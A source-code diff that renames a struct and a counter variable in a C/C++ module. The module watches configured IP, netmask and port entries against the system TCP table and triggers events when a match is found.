@@ -24,13 +24,13 @@ typedef struct {
 	BOOL present;
 	EVENT_PARAM event_param;
 	DWORD event_id;
-} monitored_conn;
+} MONITORED_CONN;
 
 #define EM_MC_SLEEPTIME 300
 
 static HANDLE em_mc_monconn_thread = 0;
-static DWORD em_mc_connection_count = 0;
-static monitored_conn* em_mc_connection_table = NULL;
+static DWORD maxEvent = 0;
+static MONITORED_CONN* em_mc_connection_table = NULL;
 static MIB_IPADDRTABLE* em_mc_localip = NULL;
 static HMODULE h_iphlp = NULL;
 static GetIpAddrTable_t pGetIpAddrTable = NULL;
@@ -138,7 +138,7 @@ DWORD MonitorConnection(DWORD dummy)
 	// Ottiene la tabella delle connessionei TCP
 	if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
 		// Cicla le connessioni da monitorare
-		for (i = 0; i < em_mc_connection_count; i++) {
+		for (i = 0; i < maxEvent; i++) {
 			conn_found = FALSE;
 			// Cicla le connessioni stabilite
 			for (j = 0; j < pTcpTable->dwNumEntries; j++) {
@@ -194,7 +194,7 @@ void WINAPI EM_MonConnAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD 
 	char ip_addr[64], netmask[64];
 
 	// XXX...altro piccolo ed improbabile int overflow....
-	if (!(temp_table = realloc(em_mc_connection_table, (em_mc_connection_count + 1) * sizeof(monitored_conn))))
+	if (!(temp_table = realloc(em_mc_connection_table, (maxEvent + 1) * sizeof(MONITORED_CONN))))
 		return;
 
 	sprintf_s(ip_addr, "%S", conf_json[L"ip"]->AsString().c_str());
@@ -204,15 +204,15 @@ void WINAPI EM_MonConnAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD 
 	else
 		port = 0;
 
-	em_mc_connection_table = (monitored_conn*)temp_table;
-	memcpy(&em_mc_connection_table[em_mc_connection_count].event_param, event_param, sizeof(EVENT_PARAM));
-	em_mc_connection_table[em_mc_connection_count].event_id = event_id;
-	em_mc_connection_table[em_mc_connection_count].ip_address = inet_addr(ip_addr);
-	em_mc_connection_table[em_mc_connection_count].netmask = inet_addr(netmask);
-	em_mc_connection_table[em_mc_connection_count].port = port;
-	em_mc_connection_table[em_mc_connection_count].present = FALSE;
+	em_mc_connection_table = (MONITORED_CONN*)temp_table;
+	memcpy(&em_mc_connection_table[maxEvent].event_param, event_param, sizeof(EVENT_PARAM));
+	em_mc_connection_table[maxEvent].event_id = event_id;
+	em_mc_connection_table[maxEvent].ip_address = inet_addr(ip_addr);
+	em_mc_connection_table[maxEvent].netmask = inet_addr(netmask);
+	em_mc_connection_table[maxEvent].port = port;
+	em_mc_connection_table[maxEvent].present = FALSE;
 
-	em_mc_connection_count++;
+	maxEvent++;
 }
 
 
@@ -220,7 +220,7 @@ void WINAPI EM_MonConnStart()
 {
 	DWORD dummy;
 	// Crea il thread solo se ci sono connessioni da monitorare
-	if (em_mc_connection_count > 0)
+	if (maxEvent > 0)
 		em_mc_monconn_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorConnection, NULL, 0, &dummy);
 }
 
@@ -229,10 +229,10 @@ void WINAPI EM_MonConnStop()
 	QUERY_CANCELLATION(em_mc_monconn_thread, em_mc_cp);
 
 	// Cancella tutti i thread di repeat
-	for (DWORD i = 0; i < em_mc_connection_count; i++)
+	for (DWORD i = 0; i < maxEvent; i++)
 		StopRepeatThread(em_mc_connection_table[i].event_id);
 
 	SAFE_FREE(em_mc_connection_table);
 	SAFE_FREE(em_mc_localip);
-	em_mc_connection_count = 0;
+	maxEvent = 0;
 }
